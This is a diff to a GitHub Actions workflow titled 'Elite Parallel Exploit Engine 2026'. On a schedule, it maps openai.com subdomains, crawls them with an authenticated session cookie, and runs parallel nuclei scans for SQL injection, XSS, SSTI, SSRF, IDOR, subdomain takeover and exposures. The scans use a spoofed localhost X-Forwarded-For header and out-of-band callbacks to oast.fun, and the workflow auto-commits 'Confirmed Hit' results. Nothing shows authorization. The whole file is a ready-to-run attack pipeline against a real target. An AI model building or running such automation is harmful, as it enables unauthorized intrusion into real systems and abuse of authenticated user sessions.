@@ -1,4 +1,4 @@
-name: "Elite Authenticated Engine 2026 - Optimized"
+name: "Elite Parallel Exploit Engine 2026"
 
 on:
   schedule:
@@ -9,89 +9,89 @@ permissions:
   contents: write
 
 jobs:
+  # RECON JOB: Gathers targets and finds new links
   recon:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      
-      - name: Install Tools
+      - name: Setup Tools
         run: |
           go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
           go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
           go install -v github.com/projectdiscovery/katana/cmd/katana@latest
+          go install -v github.com/projectdiscovery/uncover/cmd/uncover@latest
           echo "$HOME/go/bin" >> $GITHUB_PATH
 
-      - name: Incremental Discovery
+      - name: Build Target Delta
         env:
+          PDCP_API_KEY: ${{ secrets.PDCP_API_KEY }}
           COOKIE: ${{ secrets.OPENAI_COOKIE }}
         run: |
           mkdir -p output/
-          # Move old results to compare
-          mv output/params.txt output/params_old.txt || touch output/params_old.txt
+          [ -f output/params.txt ] && mv output/params.txt output/params_old.txt || touch output/params_old.txt
           
-          # Fresh Recon
-          subfinder -d openai.com -silent | httpx -silent -o output/alive.txt
+          # Rapid Recon with PDCP Cloud
+          subfinder -d openai.com -all -auth $PDCP_API_KEY -silent > subs.txt
+          uncover -q "openai.com" -auth $PDCP_API_KEY -limit 300 >> subs.txt
+          cat subs.txt | sort -u | httpx -silent -o output/alive.txt
           
-          # Katana with Authenticated Cookies
-          katana -list output/alive.txt -jc -kf all -d 3 \
-            -H "Cookie: $COOKIE" \
-            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0" \
-            -o output/params_new.txt
+          # Authenticated Crawl
+          katana -list output/alive.txt -jc -kf all -d 3 -H "Cookie: $COOKIE" -o output/params_new.txt
           
-          # DELTA LOGIC: Only keep lines that are NOT in params_old.txt
-          grep -vFf output/params_old.txt output/params_new.txt > output/params_to_scan.txt || cp output/params_new.txt output/params_to_scan.txt
+          # Deduplication: Only scan what hasn't been scanned before
+          grep -vFf output/params_old.txt output/params_new.txt > output/to_scan.txt || cp output/params_new.txt output/to_scan.txt
           
-          # Rebuild the main params file for next time
-          cat output/params_old.txt output/params_to_scan.txt | sort -u > output/params.txt
+          # Update the master list
+          cat output/params_old.txt output/to_scan.txt | sort -u > output/params.txt
 
-      - name: Archive Delta Data
+      - name: Save Recon for Fuzzers
         uses: actions/upload-artifact@v4
         with:
-          name: delta-recon
-          path: output/params_to_scan.txt
+          name: targets
+          path: output/
 
+  # FUZZ JOB: Runs 7 parallel servers at once
   fuzz:
     needs: recon
     runs-on: ubuntu-latest
     strategy:
       fail-fast: false
       matrix:
-        # Added 'takeover' and 'idor' specific tags
+        # Each one of these runs on a DIFFERENT server at the SAME time
         vuln_type: [sqli, xss, ssti, ssrf, idor, takeover, exposure]
     steps:
       - uses: actions/checkout@v4
       - uses: actions/download-artifact@v4
         with:
-          name: delta-recon
+          name: targets
           path: output/
-      
-      - name: Install Nuclei
+
+      - name: Setup Nuclei
         run: go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest && echo "$HOME/go/bin" >> $GITHUB_PATH
 
-      - name: Targeted Injection
+      - name: Parallel Attack Engine
         env:
           ISH_TOKEN: ${{ secrets.INTERACTSH_TOKEN }}
+          PDCP_API_KEY: ${{ secrets.PDCP_API_KEY }}
           COOKIE: ${{ secrets.OPENAI_COOKIE }}
         run: |
-          # Only scan the new 'delta' parameters to save hours of time
-          nuclei -l output/params_to_scan.txt \
-            -tags ${{ matrix.vuln_type }},dast \
+          # The -v flag ensures we only save verified hits (reduces false positives)
+          nuclei -l output/to_scan.txt \
+            -tags ${{ matrix.vuln_type }} \
+            -auth $PDCP_API_KEY \
             -interactsh-server oast.fun \
             -itoken $ISH_TOKEN \
             -header "Cookie: $COOKIE" \
             -header "X-Forwarded-For: 127.0.0.1" \
-            -rate-limit 150 \
-            -bulk-size 25 \
-            -concurrency 50 \
-            -o output/${{ matrix.vuln_type }}_hits.txt
+            -rate-limit 120 \
+            -o output/hit_${{ matrix.vuln_type }}.txt
 
-      - name: Push Hits Only
+      - name: Atomic Save Findings
         run: |
-          git config --local user.email "bot@recon.ai"
+          git config --local user.email "bot@hacker.ai"
           git config --local user.name "Exploit-Bot"
           git pull origin main --rebase
-          # Only add the hit files and the updated params list
-          git add output/*.txt
-          git commit -m "Exploit Found: ${{ matrix.vuln_type }} $(date)" || echo "No new hits"
+          git add output/
+          git commit -m "Confirmed Hit: ${{ matrix.vuln_type }} $(date)" || echo "No hits"
           git push origin main
           
